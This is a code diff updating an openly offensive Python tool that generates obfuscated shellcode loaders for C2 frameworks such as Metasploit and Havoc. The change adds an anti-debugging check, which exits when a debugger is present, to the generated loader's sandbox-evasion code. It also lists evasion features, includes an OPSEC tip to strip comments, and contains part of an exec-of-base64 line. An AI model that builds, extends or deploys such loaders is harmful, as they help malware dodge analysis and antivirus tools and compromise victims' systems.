@@ -10,7 +10,7 @@
 # > Script obfuscation (function and variable names are randomized + multiple encoding layer)
 # > Dynamic API resolution (via GetProcAddress and LoadLibraryA)
 # > Memory protection change after copy (PAGE_READWRITE changed to PAGE_EXECUTE_READ)
-# > Delayed execution to bypass fast sandbox analysis
+# > Basic sandbox detection and evasion (Delayed execution + Terminates execution if a debugger is detected)
 # > Compatible with shellcodes of multiple C2 frameworks (e.g., Metasploit, Havoc)
 # OPSEC advice: remove all existing comments in this script before generating your obfuscated shellcode loader.
 # =================================================================================================================================================================
@@ -67,7 +67,12 @@ def generate_loader(shellcode, key, output_path):
 
     loader_code = f"""import ctypes, zlib, time
 
-# Basic delayed execution (basic sandbox evasion)
+# Basic sandbox detection and evasion - Terminates execution if a debugger is detected (basic anti-debugging check)
+isDebuggerPresent = ctypes.windll.kernel32.IsDebuggerPresent()
+if (isDebuggerPresent):
+	sys.exit(1)
+
+# Basic sandbox evasion - Delayed execution
 time.sleep(6)
 
 def {decrypt_func}(data, key):
@@ -154,7 +159,7 @@ exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('<r
 
 banner = """
 
-Invoke-Python-ShellCodeLoader v.1.0
+Invoke-Python-ShellCodeLoader v.1.1
 .------..------..------..------..------..------..------..------..------..------.
 |P.--. ||Y.--. ||S.--. ||C.--. ||L.--. ||O.--. ||A.--. ||D.--. ||E.--. ||R.--. |
 | :/\: || (\/) || :/\: || :/\: || :/\: || :/\: || (\/) || :/\: || (\/) || :(): |
